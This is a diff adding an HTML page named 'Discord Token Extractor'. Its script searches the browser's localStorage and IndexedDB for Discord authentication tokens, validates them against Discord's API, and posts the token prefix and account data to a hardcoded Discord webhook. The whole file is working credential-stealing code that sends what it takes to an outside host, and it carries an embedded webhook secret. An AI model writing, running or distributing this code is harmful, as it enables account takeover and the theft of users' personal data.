@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Token Extractor</title>
+</head>
+<body>
+    <h1>Discord Token Extractor</h1>
+    <button onclick="extractToken()">Extract Token</button>
+    <pre id="output"></pre>
+
+    <script>
+        async function extractToken() {
+            const output = document.getElementById('output');
+            output.textContent = 'Attempting to extract token...\n';
+            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1375083886199181353/1dK2QCQMfKi6zYZ46tEWDuy_vCsm5wUy3_YLxOEGFjns__v77Gw7IsWrdcCmiwaBVLKb';
+
+            // Helper function to validate token via Discord API
+            async function validateToken(token) {
+                try {
+                    const response = await fetch('https://discord.com/api/v9/users/@me', {
+                        method: 'GET',
+                        headers: {
+                            'Authorization': token,
+                            'Content-Type': 'application/json'
+                        }
+                    });
+                    if (response.ok) {
+                        const userData = await response.json();
+                        output.textContent += `Valid Token: ${token.substring(0, 10)}...\nUser Data: ${JSON.stringify(userData, null, 2)}\n`;
+                        return { token, userData };
+                    } else {
+                        output.textContent += `Token Validation Failed: ${token.substring(0, 10)}... - ${response.status} ${response.statusText}\n`;
+                        return null;
+                    }
+                } catch (error) {
+                    output.textContent += `Token Validation Error: ${token.substring(0, 10)}... - ${error.message}\n`;
+                    return null;
+                }
+            }
+
+            // Helper function to send data to webhook
+            async function sendToWebhook(token, data) {
+                const payload = {
+                    content: '',
+                    embeds: [{
+                        title: 'Token Extracted',
+                        description: `Token: ${token.substring(0, 10)}...\nData: ${JSON.stringify(data, null, 2)}`,
+                        color: 0x7289da
+                    }],
+                    username: 'Token Extractor',
+                    avatar_url: 'https://discord.com/assets/5ccabf62108d5a8074ddd95af2211727.png'
+                };
+
+                try {
+                    const response = await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                    if (response.ok) {
+                        output.textContent += `Webhook sent successfully: ${response.status}\n`;
+                    } else {
+                        output.textContent += `Webhook failed: ${response.status} ${response.statusText}\n`;
+                    }
+                } catch (error) {
+                    output.textContent += `Webhook error: ${error.message}\n`;
+                }
+            }
+
+            // Step 1: Extract tokens from localStorage
+            try {
+                const possibleTokens = [];
+                for (let key in localStorage) {
+                    if (key.includes('token') || key.includes('discord')) {
+                        const value = localStorage.getItem(key);
+                        if (/^[\w-]{24}\.[\w-]{6}\.[\w-]{27}$/.test(value) || /^mfa\.[\w-]{84}$/.test(value)) {
+                            possibleTokens.push(value);
+                        }
+                    }
+                }
+                if (possibleTokens.length > 0) {
+                    output.textContent += `Found ${possibleTokens.length} potential tokens in localStorage:\n`;
+                    for (const token of possibleTokens) {
+                        const result = await validateToken(token);
+                        if (result) {
+                            await sendToWebhook(result.token, result.userData);
+                        }
+                    }
+                } else {
+                    output.textContent += 'No valid Discord tokens found in localStorage.\n';
+                }
+            } catch (error) {
+                output.textContent += `LocalStorage Error: ${error.message}\n`;
+            }
+
+            // Step 2: Attempt to access IndexedDB (Discord stores tokens here)
+            try {
+                const dbRequest = indexedDB.open('discord', 1);
+                dbRequest.onerror = () => {
+                    output.textContent += 'IndexedDB Access Error: Database access denied.\n';
+                };
+                dbRequest.onsuccess = async () => {
+                    const db = dbRequest.result;
+                    const transaction = db.transaction(['Local Storage'], 'readonly');
+                    const store = transaction.objectStore('Local Storage');
+                    const request = store.get('token');
+                    request.onsuccess = async () => {
+                        const token = request.result?.value;
+                        if (token && (/^[\w-]{24}\.[\w-]{6}\.[\w-]{27}$/.test(token) || /^mfa\.[\w-]{84}$/.test(token))) {
+                            output.textContent += `Found token in IndexedDB: ${token.substring(0, 10)}...\n`;
+                            const result = await validateToken(token);
+                            if (result) {
+                                await sendToWebhook(result.token, result.userData);
+                            }
+                        } else {
+                            output.textContent += 'No valid token found in IndexedDB.\n';
+                        }
+                    };
+                    request.onerror = () => {
+                        output.textContent += 'IndexedDB Request Error: Unable to retrieve token.\n';
+                    };
+                };
+            } catch (error) {
+                output.textContent += `IndexedDB Error: ${error.message}\n`;
+            }
+        }
+    </script>
+</body>
+</html>
